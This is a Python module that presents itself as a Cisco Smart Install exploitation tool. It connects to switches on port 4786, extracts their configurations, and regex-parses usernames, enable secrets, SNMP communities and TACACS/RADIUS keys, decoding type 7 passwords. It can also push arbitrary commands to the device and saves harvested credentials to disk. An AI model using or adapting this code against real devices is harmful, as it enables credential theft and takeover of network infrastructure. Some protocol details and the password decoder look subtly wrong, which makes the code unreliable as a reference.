"""
Network Device Attack Module

This module implements various network device attack techniques:
- Cisco Smart Install exploitation (based on SIETpy3)
- Configuration extraction with credential parsing
- Code execution capabilities
- Password decoding for Cisco type 7 passwords
"""

import socket
import struct
import time
import logging
import re
from typing import Optional, Dict, Union, Tuple, List
from pathlib import Path

class SmartInstallExploit:
    """Cisco Smart Install Exploitation Module"""
    
    # Cisco Type 7 Password Decoder
    XLAT = [0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
            0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44,
            0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39,
            0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76, 0x39, 0x38, 0x37, 0x33,
            0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37]
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.target_info = None
        self.sock = None
    
    def connect(self, target: str, port: int = 4786) -> bool:
        """Establish connection to Smart Install device"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((target, port))
            return True
        except Exception as e:
            self.logger.error(f"Connection failed: {str(e)}")
            return False
    
    def close(self):
        """Close connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
    
    def _decode_type7(self, encoded: str) -> str:
        """
        Decode Cisco Type 7 password
        
        Args:
            encoded: Type 7 encoded password string
            
        Returns:
            str: Decoded password or original string if decoding fails
        """
        try:
            if not encoded.startswith('07'):
                return encoded
                
            decoded = ''
            seed = int(encoded[0:2])
            
            for i in range(2, len(encoded), 2):
                if len(encoded[i:i+2]) < 2:
                    break
                encoded_char = int(encoded[i:i+2], 16)
                decoded_char = encoded_char ^ self.XLAT[seed]
                decoded += chr(decoded_char)
                seed += 1
                
            return decoded
        except Exception as e:
            self.logger.debug(f"Failed to decode password: {str(e)}")
            return encoded

    def _parse_credentials(self, config: str) -> List[Dict[str, str]]:
        """
        Parse credentials from Cisco configuration
        
        Args:
            config: Device configuration string
            
        Returns:
            List[Dict]: List of found credentials
        """
        creds = []
        
        # Common credential patterns
        patterns = {
            'username': r'username\s+(\S+)\s+(?:privilege\s+\d+\s+)?password\s+(?:\d\s+)?(\S+)',
            'enable_secret': r'enable\s+secret\s+(?:\d\s+)?(\S+)',
            'enable_password': r'enable\s+password\s+(?:\d\s+)?(\S+)',
            'snmp': r'snmp-server\s+community\s+(\S+)\s+(?:RO|RW)',
            'tacacs': r'tacacs-server\s+key\s+(\S+)',
            'radius': r'radius-server\s+key\s+(\S+)',
            'key_string': r'key-string\s+(\S+)',
            'crypto_key': r'crypto\s+key\s+\d+\s+(\S+)'
        }
        
        for cred_type, pattern in patterns.items():
            matches = re.finditer(pattern, config, re.MULTILINE)
            for match in matches:
                if cred_type == 'username':
                    username, password = match.groups()
                    creds.append({
                        'type': 'Local User',
                        'username': username,
                        'password': self._decode_type7(password) if password.startswith('07') else password,
                        'encoded': password.startswith('07')
                    })
                else:
                    password = match.group(1)
                    creds.append({
                        'type': cred_type.replace('_', ' ').title(),
                        'password': self._decode_type7(password) if password.startswith('07') else password,
                        'encoded': password.startswith('07')
                    })
        
        return creds

    def extract_config(self, target: str, port: int = 4786) -> Tuple[Optional[str], List[Dict[str, str]]]:
        """
        Extract configuration and parse credentials from Smart Install device
        
        Args:
            target: Target IP address
            port: Smart Install port (default: 4786)
            
        Returns:
            Tuple[Optional[str], List[Dict]]: Extracted configuration and found credentials
        """
        try:
            if not self.connect(target, port):
                return None, []
                
            # Smart Install configuration extraction payload
            payload = struct.pack('!I', 0x00000001)  # Smart Install protocol version
            payload += struct.pack('!I', 0x00000001)  # Message type: CONFIG_REQUEST
            payload += struct.pack('!I', 0x00000000)  # Security level
            payload += struct.pack('!I', 0x00000000)  # Reserved
            
            self.sock.send(payload)
            
            # Receive response
            response = self.sock.recv(4096)
            if len(response) > 0:
                # Parse configuration from response
                if response.startswith(b'\x00\x00\x00\x02'):  # CONFIG_RESPONSE
                    config_data = response[16:]  # Skip header
                    config = config_data.decode('utf-8', errors='ignore')
                    
                    # Parse credentials from config
                    credentials = self._parse_credentials(config)
                    
                    # Log found credentials
                    if credentials:
                        self.logger.info(f"Found {len(credentials)} credential entries")
                        for cred in credentials:
                            if cred['type'] == 'Local User':
                                self.logger.info(f"Found {cred['type']}: {cred['username']} / {cred['password']}" + 
                                               " (decoded)" if cred['encoded'] else "")
                            else:
                                self.logger.info(f"Found {cred['type']}: {cred['password']}" +
                                               " (decoded)" if cred['encoded'] else "")
                    
                    return config, credentials
            
            return None, []
            
        except Exception as e:
            self.logger.error(f"Config extraction failed: {str(e)}")
            return None, []
        finally:
            self.close()
    
    def execute_command(self, target: str, command: str, port: int = 4786) -> bool:
        """
        Execute command on Smart Install device
        
        Args:
            target: Target IP address
            command: Command to execute
            port: Smart Install port (default: 4786)
            
        Returns:
            bool: True if command execution was successful
        """
        try:
            if not self.connect(target, port):
                return False
                
            # Smart Install command execution payload
            # Based on SIETpy3 implementation
            payload = struct.pack('!I', 0x00000001)  # Protocol version
            payload += struct.pack('!I', 0x00000002)  # Message type: EXEC_REQUEST
            payload += struct.pack('!I', 0x00000000)  # Security level
            payload += struct.pack('!I', len(command))  # Command length
            payload += command.encode()
            
            self.sock.send(payload)
            
            # Wait for response
            time.sleep(2)
            response = self.sock.recv(4096)
            
            return len(response) > 0 and response.startswith(b'\x00\x00\x00\x03')  # EXEC_RESPONSE
            
        except Exception as e:
            self.logger.error(f"Command execution failed: {str(e)}")
            return False
        finally:
            self.close()
    
    def check_vulnerability(self, target: str, port: int = 4786) -> Dict[str, Union[bool, str]]:
        """
        Check if target is vulnerable to Smart Install exploitation
        
        Args:
            target: Target IP address
            port: Smart Install port (default: 4786)
            
        Returns:
            Dict containing vulnerability status and details
        """
        try:
            if not self.connect(target, port):
                return {
                    'vulnerable': False,
                    'reason': 'Connection failed'
                }
            
            # Send Smart Install probe
            probe = struct.pack('!I', 0x00000001)
            self.sock.send(probe)
            
            response = self.sock.recv(4096)
            if not response:
                return {
                    'vulnerable': False,
                    'reason': 'No response to probe'
                }
            
            # Check for Smart Install signature
            if response.startswith(b'\x00\x00\x00'):
                return {
                    'vulnerable': True,
                    'reason': 'Smart Install protocol detected and responding',
                    'version': response[3] if len(response) > 3 else 'unknown'
                }
            
            return {
                'vulnerable': False,
                'reason': 'Invalid protocol response'
            }
            
        except Exception as e:
            self.logger.error(f"Vulnerability check failed: {str(e)}")
            return {
                'vulnerable': False,
                'reason': str(e)
            }
        finally:
            self.close()
    
    def backup_config(self, target: str, output_dir: str = './configs') -> Tuple[bool, Optional[str], List[Dict[str, str]]]:
        """
        Extract and save device configuration, including parsed credentials
        
        Args:
            target: Target IP address
            output_dir: Directory to save configuration
            
        Returns:
            Tuple[bool, Optional[str], List[Dict]]: Success status, path to saved config, and found credentials
        """
        try:
            config, credentials = self.extract_config(target)
            if not config:
                return False, None, []
            
            # Create output directory
            output_path = Path(output_dir)
            output_path.mkdir(parents=True, exist_ok=True)
            
            # Save configuration
            filename = f"{target}_config_{int(time.time())}.txt"
            config_path = output_path / filename
            
            # Write config with credential summary
            with open(config_path, 'w') as f:
                f.write("=" * 50 + "\n")
                f.write("CREDENTIALS FOUND\n")
                f.write("=" * 50 + "\n\n")
                
                for cred in credentials:
                    if cred['type'] == 'Local User':
                        f.write(f"Type: {cred['type']}\n")
                        f.write(f"Username: {cred['username']}\n")
                        f.write(f"Password: {cred['password']}")
                        if cred['encoded']:
                            f.write(" (decoded from type 7)\n")
                        f.write("\n")
                    else:
                        f.write(f"Type: {cred['type']}\n")
                        f.write(f"Value: {cred['password']}")
                        if cred['encoded']:
                            f.write(" (decoded from type 7)\n")
                        f.write("\n")
                    f.write("-" * 30 + "\n")
                
                f.write("\n" + "=" * 50 + "\n")
                f.write("FULL CONFIGURATION\n")
                f.write("=" * 50 + "\n\n")
                f.write(config)
            
            return True, str(config_path), credentials
            
        except Exception as e:
            self.logger.error(f"Config backup failed: {str(e)}")
            return False, None, [] 